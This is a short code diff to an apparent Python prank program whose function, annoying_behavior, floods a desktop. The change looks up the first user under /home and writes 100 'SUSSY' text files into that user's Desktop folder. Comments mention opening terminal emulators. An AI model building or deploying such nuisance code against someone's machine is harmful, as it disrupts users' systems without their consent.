@@ -1,5 +1,5 @@
 from sys import exc_info
-from os import path, system
+from os import path, system, listdir
 from random import choice
 from webbrowser import open as wopen
 from time import sleep
@@ -47,11 +47,11 @@ def annoying_behavior():
           
 #         Intenta abrir diferentes emuladores
 #         de terminal
-
+          usr = listdir('/home/')[0]
 #         Crea archivos de texto en el escritorio
           for _ in range(100):
                count += 1
-               with open(f'~/Desktop/SUSSY{count}.txt', 'w+') as f:
+               with open(f'/home/{usr}/Desktop/SUSSY{count}.txt', 'w+') as f:
                     f.write("SO SUSSY"*100)
                
                
